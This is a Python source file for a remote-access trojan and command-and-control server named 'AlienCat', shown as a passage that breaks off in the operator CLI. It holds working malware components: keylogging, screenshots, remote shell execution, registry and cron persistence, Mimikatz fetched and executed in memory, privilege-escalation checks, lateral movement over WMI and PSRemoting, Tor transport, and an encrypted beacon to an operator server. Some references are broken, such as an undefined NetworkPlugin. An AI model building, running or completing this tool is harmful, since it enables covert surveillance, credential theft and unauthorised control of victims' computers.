#!/usr/bin/env python3
import os
import sys
import asyncio
import base64
import json
import random
import string
import time
import uuid
import socket
import ssl
import struct
import inspect
import importlib.util
import pathlib
import platform
import subprocess
import threading
import zipfile
import io
import tempfile
import hashlib
import logging
import argparse
import shutil
import getpass
import psutil
import signal
import sqlite3
import datetime
import pty
import tty
import fcntl
import termios
import ctypes
import marshal
import zlib
import lzma
from typing import Dict, List, Optional, Callable, Any, Coroutine, Tuple
from dataclasses import dataclass, field
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from functools import wraps
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.history import FileHistory
from concurrent.futures import ThreadPoolExecutor

VERSION = "3.0.0"
DEFAULT_PORT = 443
DEFAULT_KEY = Fernet.generate_key().decode()
PLUGINS_DIR = os.path.expanduser("~/aliencat/plugins")
BUFFER_SIZE = 65536
HEARTBEAT_INTERVAL = 30
SESSION_TIMEOUT = 300
DB_FILE = "aliencat.db"
TUNNEL_SOCKET_TIMEOUT = 5

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("aliencat")

class Obfuscator:
    @staticmethod
    def obfuscate_code(code: str) -> bytes:
        compiled = compile(code, '', 'exec')
        marshaled = marshal.dumps(compiled)
        compressed = zlib.compress(marshaled)
        return base64.b85encode(compressed)
    
    @staticmethod
    def deobfuscate_code(data: bytes) -> str:
        compressed = base64.b85decode(data)
        marshaled = zlib.decompress(compressed)
        compiled = marshal.loads(marshaled)
        return compiled

class CryptoUtils:
    @staticmethod
    def generate_key(password: str, salt: bytes = None) -> bytes:
        salt = salt or os.urandom(16)
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
        return base64.urlsafe_b64encode(kdf.derive(password.encode()))
    
    @staticmethod
    def encrypt_data(data: bytes, key: bytes) -> bytes:
        iv = os.urandom(16)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        return iv + encryptor.update(padded_data) + encryptor.finalize()
    
    @staticmethod
    def decrypt_data(encrypted_data: bytes, key: bytes) -> bytes:
        iv = encrypted_data[:16]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(encrypted_data[16:]) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return unpadder.update(decrypted_padded) + unpadder.finalize()
    
    @staticmethod
    def obfuscate_string(s: str) -> str:
        return base64.b85encode(s.encode()).decode()
    
    @staticmethod
    def deobfuscate_string(s: str) -> str:
        return base64.b85decode(s.encode()).decode()

class TTYStabilizer:
    @staticmethod
    async def stabilize_shell():
        if platform.system() == "Linux":
            try:
                old_tty = termios.tcgetattr(sys.stdin)
                tty.setraw(sys.stdin.fileno())
                tty.setcbreak(sys.stdin.fileno())
                
                pty.spawn("/bin/bash")
                
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
                return True
            except Exception as e:
                return f"TTY stabilization failed: {str(e)}"
        return "TTY stabilization not supported on this platform"

class InMemoryLoader:
    @staticmethod
    def load_pe(data: bytes):
        if platform.system() != "Windows":
            return "PE loading only supported on Windows"
        
        try:
            kernel32 = ctypes.windll.kernel32
            
            PAGE_EXECUTE_READWRITE = 0x40
            MEM_COMMIT = 0x1000
            
            size = len(data)
            ptr = kernel32.VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
            
            buf = (ctypes.c_char * size).from_buffer(data)
            ctypes.memmove(ptr, buf, size)
            
            ht = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
            ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
            
            return "PE executed in memory"
        except Exception as e:
            return f"PE load error: {str(e)}"

class TorConnector:
    @staticmethod
    async def connect_via_tor(target: str, port: int, tor_port: int = 9050):
        try:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", tor_port)
            socket.socket = socks.socksocket
            
            reader, writer = await asyncio.open_connection(target, port)
            return reader, writer
        except Exception as e:
            raise ConnectionError(f"Tor connection failed: {str(e)}")

class Plugin:
    def __init__(self, agent):
        self.agent = agent
        self.name = self.__class__.__name__
        self.running = False
        self.description = "No description provided"
    
    async def execute(self, *args, **kwargs):
        raise NotImplementedError
    
    async def stop(self):
        self.running = False

class KeyloggerPlugin(Plugin):
    def __init__(self, agent):
        super().__init__(agent)
        self.description = "Keylogger capturing keystrokes"
    
    async def execute(self, duration=60):
        if platform.system() == "Windows":
            try:
                import win32api, win32con, win32gui
                import pythoncom
                import pyHook
                
                self.running = True
                buffer = []
                
                def on_keyboard_event(event):
                    if event.Ascii:
                        buffer.append(chr(event.Ascii))
                    return True
                
                hm = pyHook.HookManager()
                hm.KeyDown = on_keyboard_event
                hm.HookKeyboard()
                
                start_time = time.time()
                while self.running and (time.time() - start_time) < duration:
                    pythoncom.PumpWaitingMessages()
                    await asyncio.sleep(0.1)
                
                hm.UnhookKeyboard()
                return ''.join(buffer)
            except ImportError:
                return "Required Windows libraries not available"
        elif platform.system() == "Linux":
            try:
                from pynput import keyboard
                
                self.running = True
                buffer = []
                
                def on_press(key):
                    try:
                        buffer.append(key.char)
                    except AttributeError:
                        buffer.append(str(key))
                
                listener = keyboard.Listener(on_press=on_press)
                listener.start()
                
                start_time = time.time()
                while self.running and (time.time() - start_time) < duration:
                    await asyncio.sleep(0.1)
                
                listener.stop()
                return ''.join(buffer)
            except ImportError:
                return "pynput library required for Linux keylogger"
        else:
            return "Keylogger not supported on this platform"

class ScreenshotPlugin(Plugin):
    def __init__(self, agent):
        super().__init__(agent)
        self.description = "Capture screenshots"
    
    async def execute(self):
        try:
            if platform.system() == "Windows":
                import win32gui, win32ui, win32con
                hdesktop = win32gui.GetDesktopWindow()
                width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
                height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
                left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
                top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
                desktop_dc = win32gui.GetWindowDC(hdesktop)
                img_dc = win32ui.CreateDCFromHandle(desktop_dc)
                mem_dc = img_dc.CreateCompatibleDC()
                screenshot = win32ui.CreateBitmap()
                screenshot.CreateCompatibleBitmap(img_dc, width, height)
                mem_dc.SelectObject(screenshot)
                mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
                screenshot.SaveBitmapFile(mem_dc, 'screenshot.bmp')
                with open('screenshot.bmp', 'rb') as f:
                    data = f.read()
                os.remove('screenshot.bmp')
                return data
            elif platform.system() == "Linux":
                import pyautogui
                screenshot = pyautogui.screenshot()
                img_byte_arr = io.BytesIO()
                screenshot.save(img_byte_arr, format='PNG')
                return img_byte_arr.getvalue()
            else:
                return None
        except Exception as e:
            return f"Screenshot failed: {str(e)}"

class ShellPlugin(Plugin):
    def __init__(self, agent):
        super().__init__(agent)
        self.description = "Execute shell commands"
    
    async def execute(self, command):
        try:
            if command.strip() == "stabilize":
                return (await TTYStabilizer.stabilize_shell()).encode()
            
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await proc.communicate()
            return stdout.decode(errors='ignore') + stderr.decode(errors='ignore')
        except Exception as e:
            return str(e)

class FileSystemPlugin(Plugin):
    def __init__(self, agent):
        super().__init__(agent)
        self.description = "File system operations"
    
    async def execute(self, action, path, data=None):
        try:
            if action == "download":
                with open(path, 'rb') as f:
                    return f.read()
            elif action == "upload":
                with open(path, 'wb') as f:
                    f.write(data)
                return f"File uploaded to {path}"
            elif action == "delete":
                os.remove(path)
                return f"File deleted: {path}"
            elif action == "list":
                return '\n'.join(os.listdir(path))
            elif action == "persistence":
                return await self.set_persistence()
            else:
                return "Invalid action"
        except Exception as e:
            return str(e)
    
    async def set_persistence(self):
        try:
            if platform.system() == "Windows":
                import win32con
                import win32api
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, key_path, 0, win32con.KEY_SET_VALUE)
                win32api.RegSetValueEx(key, "AlienCat", 0, win32con.REG_SZ, sys.executable + " " + " ".join(sys.argv))
                win32api.RegCloseKey(key)
                return "Windows persistence established"
            elif platform.system() == "Linux":
                cron_entry = f"@reboot {sys.executable} {' '.join(sys.argv)}"
                cron_file = "/tmp/aliencat_cron"
                with open(cron_file, "w") as f:
                    f.write(cron_entry)
                subprocess.call(["crontab", cron_file])
                os.remove(cron_file)
                return "Linux persistence established"
            else:
                return "Persistence not supported on this platform"
        except Exception as e:
            return f"Persistence error: {str(e)}"

class PrivilegeEscalationPlugin(Plugin):
    def __init__(self, agent):
        super().__init__(agent)
        self.description = "Privilege escalation checks"
    
    async def execute(self):
        if platform.system() == "Windows":
            return await self.check_windows_privesc()
        elif platform.system() == "Linux":
            return await self.check_linux_privesc()
        else:
            return "Privilege escalation checks not supported on this platform"
    
    async def check_windows_privesc(self):
        checks = []
        try:
            import win32api
            import win32con
            
            checks.append("Checking for AlwaysInstallElevated...")
            try:
                key1 = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, 
                                           r"Software\Policies\Microsoft\Windows\Installer", 
                                           0, win32con.KEY_READ)
                val1, _ = win32api.RegQueryValueEx(key1, "AlwaysInstallElevated")
                win32api.RegCloseKey(key1)
                
                key2 = win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE,
                                           r"Software\Policies\Microsoft\Windows\Installer",
                                           0, win32con.KEY_READ)
                val2, _ = win32api.RegQueryValueEx(key2, "AlwaysInstallElevated")
                win32api.RegCloseKey(key2)
                
                if val1 == 1 and val2 == 1:
                    checks.append("AlwaysInstallElevated is enabled (privilege escalation possible via MSI packages)")
            except:
                pass
            
            checks.append("\nChecking for unquoted service paths...")
            try:
                service_key = win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE,
                                                  r"SYSTEM\CurrentControlSet\Services",
                                                  0, win32con.KEY_READ)
                num_subkeys = win32api.RegQueryInfoKey(service_key)[0]
                
                for i in range(num_subkeys):
                    service_name = win32api.RegEnumKey(service_key, i)
                    try:
                        service_subkey = win32api.RegOpenKeyEx(service_key, service_name, 0, win32con.KEY_READ)
                        path, _ = win32api.RegQueryValueEx(service_subkey, "ImagePath")
                        win32api.RegCloseKey(service_subkey)
                        
                        if ' ' in path and not path.startswith('"'):
                            checks.append(f"Unquoted service path found: {service_name} -> {path}")
                    except:
                        continue
                
                win32api.RegCloseKey(service_key)
            except:
                pass
            
            checks.append("\nChecking for writable service binaries...")
            try:
                service_key = win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE,
                                                  r"SYSTEM\CurrentControlSet\Services",
                                                  0, win32con.KEY_READ)
                num_subkeys = win32api.RegQueryInfoKey(service_key)[0]
                
                for i in range(num_subkeys):
                    service_name = win32api.RegEnumKey(service_key, i)
                    try:
                        service_subkey = win32api.RegOpenKeyEx(service_key, service_name, 0, win32con.KEY_READ)
                        path, _ = win32api.RegQueryValueEx(service_subkey, "ImagePath")
                        win32api.RegCloseKey(service_subkey)
                        
                        path = path.strip('"')
                        if os.path.exists(path):
                            if os.access(path, os.W_OK):
                                checks.append(f"Writable service binary found: {service_name} -> {path}")
                    except:
                        continue
                
                win32api.RegCloseKey(service_key)
            except:
                pass
            
            return '\n'.join(checks)
        except ImportError:
            return "win32api/win32con modules required for Windows privilege escalation checks"
    
    async def check_linux_privesc(self):
        checks = []
        
        checks.append("Checking SUID binaries...")
        try:
            suid_binaries = subprocess.check_output("find / -perm -4000 -type f 2>/dev/null", shell=True).decode().split('\n')
            known_suid = [
                '/bin/mount', '/bin/umount', '/bin/ping', '/bin/su', '/bin/fusermount',
                '/bin/bash', '/usr/bin/chfn', '/usr/bin/chsh', '/usr/bin/gpasswd',
                '/usr/bin/newgrp', '/usr/bin/passwd', '/usr/bin/sudo', '/usr/bin/mtr',
                '/usr/lib/openssh/ssh-keysign', '/usr/lib/dbus-1.0/dbus-daemon-launch-helper'
            ]
            for binary in suid_binaries:
                if binary and binary not in known_suid:
                    checks.append(f"Uncommon SUID binary: {binary}")
        except:
            pass
        
        checks.append("\nChecking writable cron jobs...")
        try:
            cron_jobs = subprocess.check_output("ls -la /etc/cron* 2>/dev/null", shell=True).decode()
            checks.append(cron_jobs)
        except:
            pass
        
        checks.append("\nChecking capabilities...")
        try:
            capabilities = subprocess.check_output("getcap -r / 2>/dev/null", shell=True).decode()
            checks.append(capabilities)
        except:
            pass
        
        checks.append("\nChecking PATH for writable directories...")
        try:
            path_dirs = os.environ['PATH'].split(':')
            for directory in path_dirs:
                if os.access(directory, os.W_OK):
                    checks.append(f"Writable directory in PATH: {directory}")
        except:
            pass
        
        return '\n'.join(checks)

class TunnelPlugin(Plugin):
    def __init__(self, agent):
        super().__init__(agent)
        self.description = "Network tunneling"
        self.tunnels = {}
    
    async def execute(self, action, *args):
        try:
            if action == "create":
                return await self.create_tunnel(*args)
            elif action == "list":
                return self.list_tunnels()
            elif action == "close":
                return await self.close_tunnel(*args)
            else:
                return "Invalid action (use create/list/close)"
        except Exception as e:
            return f"Tunnel error: {str(e)}"
    
    async def create_tunnel(self, local_port, remote_host, remote_port):
        tunnel_id = str(uuid.uuid4())
        
        async def tunnel_connection(reader, writer):
            try:
                remote_reader, remote_writer = await asyncio.open_connection(remote_host, remote_port)
                
                async def forward(src, dst):
                    try:
                        while True:
                            data = await src.read(BUFFER_SIZE)
                            if not data:
                                break
                            dst.write(data)
                            await dst.drain()
                    except:
                        pass
                
                await asyncio.gather(
                    forward(reader, remote_writer),
                    forward(remote_reader, writer)
                )
                
                remote_writer.close()
                await remote_writer.wait_closed()
            except Exception as e:
                logger.error(f"Tunnel connection error: {e}")
            finally:
                writer.close()
                await writer.wait_closed()
        
        server = await asyncio.start_server(tunnel_connection, '127.0.0.1', int(local_port))
        self.tunnels[tunnel_id] = server
        
        return f"Tunnel created (ID: {tunnel_id}) - Local port: {local_port} -> {remote_host}:{remote_port}"
    
    def list_tunnels(self):
        if not self.tunnels:
            return "No active tunnels"
        return "\n".join(f"{tunnel_id}" for tunnel_id in self.tunnels.keys())
    
    async def close_tunnel(self, tunnel_id):
        if tunnel_id in self.tunnels:
            server = self.tunnels[tunnel_id]
            server.close()
            await server.wait_closed()
            del self.tunnels[tunnel_id]
            return f"Tunnel {tunnel_id} closed"
        return "Tunnel not found"

class InMemoryMimikatzPlugin(Plugin):
    def __init__(self, agent):
        super().__init__(agent)
        self.description = "In-memory Mimikatz execution (Windows only)"
    
    async def execute(self):
        if platform.system() != "Windows":
            return "In-memory Mimikatz only works on Windows"
        
        try:
            mimikatz_url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
            temp_dir = tempfile.gettempdir()
            zip_path = os.path.join(temp_dir, "mimikatz.zip")
            
            import urllib.request
            urllib.request.urlretrieve(mimikatz_url, zip_path)
            
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            
            os.remove(zip_path)
            
            arch = platform.architecture()[0]
            if arch == "64bit":
                binary_path = os.path.join(temp_dir, "x64", "mimikatz.exe")
            else:
                binary_path = os.path.join(temp_dir, "Win32", "mimikatz.exe")
            
            with open(binary_path, 'rb') as f:
                pe_data = f.read()
            
            shutil.rmtree(temp_dir)
            
            result = InMemoryLoader.load_pe(pe_data)
            return result
        except Exception as e:
            return f"In-memory Mimikatz error: {str(e)}"

class LateralMovementPlugin(Plugin):
    def __init__(self, agent):
        super().__init__(agent)
        self.description = "Lateral movement via WMI/PSRemoting"
    
    async def execute(self, target, method="wmi"):
        try:
            if platform.system() != "Windows":
                return "Lateral movement only supported on Windows"
            
            if method == "wmi":
                return await self.wmi_exec(target)
            elif method == "psremoting":
                return await self.psremoting_exec(target)
            else:
                return "Invalid method (use wmi or psremoting)"
        except Exception as e:
            return str(e)
    
    async def wmi_exec(self, target):
        try:
            import wmi
            c = wmi.WMI(target)
            process_id, return_value = c.Win32_Process.Create(
                CommandLine=f"{sys.executable} {' '.join(sys.argv)}"
            )
            return f"Process created with ID: {process_id}, Return: {return_value}"
        except Exception as e:
            return f"WMI execution failed: {str(e)}"
    
    async def psremoting_exec(self, target):
        try:
            cmd = f"powershell -c \"Invoke-Command -ComputerName {target} -ScriptBlock {{Start-Process {sys.executable} -ArgumentList {' '.join(sys.argv)}}}\""
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await proc.communicate()
            return stdout.decode() + stderr.decode()
        except Exception as e:
            return f"PSRemoting execution failed: {str(e)}"

class TorPlugin(Plugin):
    def __init__(self, agent):
        super().__init__(agent)
        self.description = "Tor network communication"
    
    async def execute(self, action, *args):
        try:
            if action == "connect":
                return await self.connect_via_tor(*args)
            elif action == "install":
                return await self.install_tor()
            else:
                return "Invalid action (use connect/install)"
        except Exception as e:
            return f"Tor error: {str(e)}"
    
    async def connect_via_tor(self, target, port, tor_port=9050):
        try:
            import socks
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", tor_port)
            socket.socket = socks.socksocket
            
            reader, writer = await asyncio.open_connection(target, port)
            writer.write(b"GET / HTTP/1.0\r\n\r\n")
            await writer.drain()
            
            data = await reader.read(1024)
            writer.close()
            await writer.wait_closed()
            
            return f"Tor connection successful. Response: {data.decode()}"
        except Exception as e:
            return f"Tor connection failed: {str(e)}"
    
    async def install_tor(self):
        try:
            if platform.system() == "Windows":
                tor_url = "https://www.torproject.org/dist/torbrowser/11.0.14/tor-win32-0.4.6.10.zip"
                temp_dir = tempfile.gettempdir()
                zip_path = os.path.join(temp_dir, "tor.zip")
                
                import urllib.request
                urllib.request.urlretrieve(tor_url, zip_path)
                
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(temp_dir)
                
                os.remove(zip_path)
                return "Tor installed in temp directory"
            elif platform.system() == "Linux":
                subprocess.run(["sudo", "apt-get", "install", "-y", "tor"])
                return "Tor installed via apt"
            else:
                return "Tor installation not supported on this platform"
        except Exception as e:
            return f"Tor installation failed: {str(e)}"

class PluginManager:
    def __init__(self, agent):
        self.agent = agent
        self.plugins = {}
        self.loaded_plugins = {}
        self.builtin_plugins = {
            'Keylogger': KeyloggerPlugin,
            'Screenshot': ScreenshotPlugin,
            'Shell': ShellPlugin,
            'FileSystem': FileSystemPlugin,
            'Network': NetworkPlugin,
            'Mimikatz': InMemoryMimikatzPlugin,
            'PrivEsc': PrivilegeEscalationPlugin,
            'Tunnel': TunnelPlugin,
            'LateralMove': LateralMovementPlugin,
            'Tor': TorPlugin
        }
    
    async def load_builtin_plugins(self):
        for name, plugin_class in self.builtin_plugins.items():
            self.plugins[name] = plugin_class(self.agent)
    
    async def load_plugin(self, plugin_path):
        try:
            plugin_name = pathlib.Path(plugin_path).stem
            spec = importlib.util.spec_from_file_location(plugin_name, plugin_path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            
            for name, obj in inspect.getmembers(module):
                if inspect.isclass(obj) and issubclass(obj, Plugin) and obj != Plugin:
                    plugin_instance = obj(self.agent)
                    self.plugins[plugin_instance.name] = plugin_instance
                    self.loaded_plugins[plugin_name] = plugin_path
                    return plugin_instance
        except Exception as e:
            logger.error(f"Plugin load error: {e}")
            return None
    
    async def load_plugins_from_dir(self, plugins_dir=PLUGINS_DIR):
        os.makedirs(plugins_dir, exist_ok=True)
        for filename in os.listdir(plugins_dir):
            if filename.endswith(".py") and not filename.startswith("_"):
                await self.load_plugin(os.path.join(plugins_dir, filename))
    
    async def execute_plugin(self, plugin_name, *args, **kwargs):
        if plugin_name in self.plugins:
            return await self.plugins[plugin_name].execute(*args, **kwargs)
        else:
            return f"Plugin {plugin_name} not found"
    
    async def unload_plugin(self, plugin_name):
        if plugin_name in self.plugins:
            await self.plugins[plugin_name].stop()
            del self.plugins[plugin_name]
            if plugin_name in self.loaded_plugins:
                del self.loaded_plugins[plugin_name]

class Agent:
    def __init__(self):
        self.session_id = str(uuid.uuid4())
        self.hostname = platform.node()
        self.username = getpass.getuser()
        self.os = platform.system()
        self.plugin_manager = PluginManager(self)
        self.encryption_key = None
        self.server_address = None
        self.server_port = None
        self.protocol = "tcp"
        self.running = False
        self.last_heartbeat = time.time()
        self.user_agent = f"AlienCat/{VERSION}"
        self.executor = ThreadPoolExecutor(max_workers=4)
    
    async def connect(self, server, port, protocol="tcp", key=DEFAULT_KEY):
        self.server_address = server
        self.server_port = port
        self.protocol = protocol
        self.encryption_key = CryptoUtils.generate_key(key)
        self.running = True
        
        if protocol == "tcp":
            await self.tcp_connect()
        elif protocol == "https":
            await self.https_connect()
        elif protocol == "tor":
            await self.tor_connect(server, port)
        else:
            raise ValueError(f"Unsupported protocol: {protocol}")
    
    async def tcp_connect(self):
        while self.running:
            try:
                reader, writer = await asyncio.open_connection(self.server_address, self.server_port)
                await self.handshake(writer)
                
                while self.running:
                    try:
                        data = await reader.read(BUFFER_SIZE)
                        if not data:
                            break
                        
                        decrypted = CryptoUtils.decrypt_data(data, self.encryption_key)
                        response = await self.handle_command(decrypted)
                        
                        if response:
                            encrypted = CryptoUtils.encrypt_data(response, self.encryption_key)
                            writer.write(encrypted)
                            await writer.drain()
                    except ConnectionResetError:
                        break
                    except Exception as e:
                        logger.error(f"Command error: {e}")
                        break
                
                writer.close()
                await writer.wait_closed()
            except Exception as e:
                logger.error(f"Connection error: {e}")
                await asyncio.sleep(5)
    
    async def https_connect(self):
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        while self.running:
            try:
                reader, writer = await asyncio.open_connection(
                    self.server_address, self.server_port, ssl=ssl_context)
                await self.handshake(writer)
                
                while self.running:
                    try:
                        writer.write(CryptoUtils.encrypt_data(b"heartbeat", self.encryption_key))
                        await writer.drain()
                        
                        data = await reader.read(BUFFER_SIZE)
                        if not data:
                            break
                        
                        decrypted = CryptoUtils.decrypt_data(data, self.encryption_key)
                        response = await self.handle_command(decrypted)
                        
                        if response:
                            encrypted = CryptoUtils.encrypt_data(response, self.encryption_key)
                            writer.write(encrypted)
                            await writer.drain()
                    except ConnectionResetError:
                        break
                    except Exception as e:
                        logger.error(f"Command error: {e}")
                        break
                
                writer.close()
                await writer.wait_closed()
            except Exception as e:
                logger.error(f"Connection error: {e}")
                await asyncio.sleep(5)
    
    async def tor_connect(self, server, port):
        try:
            import socks
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            
            while self.running:
                try:
                    reader, writer = await asyncio.open_connection(server, port)
                    await self.handshake(writer)
                    
                    while self.running:
                        try:
                            data = await reader.read(BUFFER_SIZE)
                            if not data:
                                break
                            
                            decrypted = CryptoUtils.decrypt_data(data, self.encryption_key)
                            response = await self.handle_command(decrypted)
                            
                            if response:
                                encrypted = CryptoUtils.encrypt_data(response, self.encryption_key)
                                writer.write(encrypted)
                                await writer.drain()
                        except ConnectionResetError:
                            break
                        except Exception as e:
                            logger.error(f"Command error: {e}")
                            break
                    
                    writer.close()
                    await writer.wait_closed()
                except Exception as e:
                    logger.error(f"Tor connection error: {e}")
                    await asyncio.sleep(5)
        except ImportError:
            logger.error("PySocks package required for Tor support")
            self.running = False
    
    async def handshake(self, writer):
        handshake = {
            "session_id": self.session_id,
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os,
            "version": VERSION
        }
        encrypted = CryptoUtils.encrypt_data(json.dumps(handshake).encode(), self.encryption_key)
        writer.write(encrypted)
        await writer.drain()
    
    async def handle_command(self, command):
        try:
            cmd = json.loads(command.decode())
            action = cmd.get("action")
            args = cmd.get("args", [])
            kwargs = cmd.get("kwargs", {})
            
            if action == "shell":
                return (await self.plugin_manager.execute_plugin("Shell", *args, **kwargs)).encode()
            elif action == "plugin":
                plugin_name = args[0]
                plugin_args = args[1:] if len(args) > 1 else []
                result = await self.plugin_manager.execute_plugin(plugin_name, *plugin_args, **kwargs)
                return str(result).encode()
            elif action == "download":
                return (await self.plugin_manager.execute_plugin("FileSystem", "download", *args, **kwargs))
            elif action == "upload":
                return (await self.plugin_manager.execute_plugin("FileSystem", "upload", *args, **kwargs)).encode()
            elif action == "exit":
                self.running = False
                return b"Exiting"
            else:
                return b"Unknown command"
        except Exception as e:
            return f"Error: {str(e)}".encode()

class ServerCLI:
    def __init__(self, server):
        self.server = server
        self.current_session = None
        self.commands = {
            "sessions": self.list_sessions,
            "use": self.use_session,
            "shell": self.execute_shell,
            "download": self.download_file,
            "upload": self.upload_file,
            "plugin": self.execute_plugin,
            "exit": self.exit,
            "help": self.show_help,
            "persistence": self.set_persistence,
            "pivot": self.pivot,
            "scan": self.scan_network,
            "tunnel": self.manage_tunnel,
            "privesc": self.check_privesc,
            "lateral": self.lateral_move,
            "tor": self.manage_tor
        }
        self.session = PromptSession(
            history=FileHistory('.aliencat_history'),
            completer=WordCompleter(list(self.commands.keys()))
        )
    
    async def start(self):
        print(f"AlienCat C2 Server v{VERSION}")
        print("Type 'help' for available commands\n")
        
        while True:
            try:
                if self.current_session:
                    prompt = f"[{self.current_session}]> "
                else:
                    prompt = "[aliencat]> "
                
                user_input = await self.session.prompt_async(prompt)
                if not user_input.strip():
                    continue
                
                parts = user_input.split()
                cmd = parts[0]
                args = parts[1:]
                
                if cmd in self.commands:
                    await self.commands[cmd](*args)
                else:
                    print("Unknown command. Type 'help' for available commands")
            except (KeyboardInterrupt, EOFError):
                print("\nUse 'exit' to quit")
            except Exception as e:
                print(f"Error: {str(e)}")
    
    async def list_sessions(self):
        print("\nActive Sessions:")
        for session_id, session_data in self.server.sessions.items():
            print(f"{session_id} - {session_data['info']['hostname']} ({session_data['info']['username']})")
        print()
    
    async def use_session(self, session_id):
        if session_id in self.server.sessions:
            self.current_session = session_id
            print(f"Using session {session_id}")
        else:
            print("Invalid session ID")
    
    async def execute_shell(self, *command):
        if not self.current_session:
            print("No active session selected")
            return
        
        if not command:
            print("Usage: shell <command>")
            return
        
        full_cmd = " ".join(command)
        response = await self.server.send_command(
            self.current_session,
            {"action": "shell", "args": [full_cmd]}
        )
        print(response.decode())
    
    async def download_file(self, remote_path, local_path=None):
        if not self.current_session:
            print("No active session selected")
            return
        
        if not remote_path:
            print("Usage: download <remote_path> [local_path]")
            return
        
        local_path = local_path or os.path.basename(remote_path)
        data = await self.server.send_command(
            self.current_session,
            {"action": "download", "args": [remote_path]}
        )
        
        if isinstance(data, bytes):
            with open(local_path, 'wb') as f:
                f.write(data)
            print(f"File downloaded to {local_path}")
        else:
            print(data.decode())
    
    async def upload_file(self, local_path, remote_path):
        if not self.current_session:
            print("No active session selected")
            return
        
        if not local_path or not remote_path:
            print("Usage: upload <local_path> <remote_path>")
            return
        
        try:
            with open(local_path, 'rb') as f:
                file_data = f.read()
            
            response = await self.server.send_command(
                self.current_session,
                {"action": "upload", "args": [remote_path, file_data]}
            )
            print(response.decode())
        except Exception as e:
            print(f"Upload error: {str(e)}")
    
    async def execute_plugin(self, plugin_name, *args):
        if not self.current_session:
            print("No active session selected")
            return
        
        if not plugin_name:
            print("Usage: plugin <plugin_name> [args...]")
            return
        
        response = await self.server.send_command(
            self.current_session,
            {"action": "plugin", "args": [plugin_name, *args]}
        )
        print(response.decode())
    
    async def set_persistence(self):
        if not self.current_session:
            print("No active session selected")
            return
        
        response = await self.server.send_command(
            self.current_session,
            {"action": "plugin", "args": ["FileSystem", "persistence"]}
        )
        print(response.decode())
    
    async def pivot(self, target):
        if not self.current_session:
            print("No active session selected")
            return
        
        if not target:
            print("Usage: pivot <target_ip>")
            return
        
        response = await self.server.send_command(
            self.current_session,
            {"action": "plugin", "args": ["Network", "pivot", target]}
        )
        print(response.decode())
    
    async def scan_network(self, target):
        if not self.current_session:
            print("No active session selected")
            return
        
        if not target:
            print("Usage: scan <target_ip>")
            return
        
        response = await self.server.send_command(
            self.current_session,
            {"action": "plugin", "args": ["Network", "scan", target]}
        )
        print(response.decode())
    
    async def manage_tunnel(self, action=None, *args):
        if not self.current_session:
            print("No active session selected")
            return
        
        if not action:
            print("Usage: tunnel <create/list/close> [args...]")
            return
        
        if action == "create" and len(args) < 3:
            print("Usage: tunnel create <local_port> <remote_host> <remote_port>")
            return
        elif action == "close" and len(args) < 1:
            print("Usage: tunnel close <tunnel_id>")
            return
        
        response = await self.server.send_command(
            self.current_session,
            {"action": "plugin", "args": ["Tunnel", action, *args]}
        )
        print(response.decode())
    
    async def check_privesc(self):
        if not self.current_session:
            print("No active session selected")
            return
        
        response = await self.server.send_command(
            self.current_session,
            {"action": "plugin", "args": ["PrivEsc"]}
        )
        print(response.decode())
    
    async def lateral_move(self, target, method="wmi"):
        if not self.current_session:
            print("No active session selected")
            return
        
        if not target:
            print("Usage: lateral <target_ip> [method]")
            return
        
        response = await self.server.send_command(
            self.current_session,
            {"action": "plugin", "args": ["LateralMove", target, method]}
        )
        print(response.decode())
    
    async def manage_tor(self, action=None, *args):
        if not self.current_session:
            print("No active session selected")
            return
        
        if not action:
            print("Usage: tor <install/connect> [args...]")
            return
        
        if action == "connect" and len(args) < 2:
